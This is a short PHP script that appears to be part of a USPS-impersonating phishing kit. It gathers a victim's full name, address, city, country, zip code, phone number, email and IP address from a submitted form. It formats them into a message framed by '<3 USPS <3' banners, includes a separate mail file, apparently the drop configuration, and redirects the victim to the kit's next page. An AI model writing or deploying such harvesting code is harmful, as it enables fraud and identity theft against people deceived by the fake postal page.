<?php
    require 'email1.php';
   $message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nCountry  : ".$_POST['ct']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail   : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";

header('Location: ./index2.php?/');
?>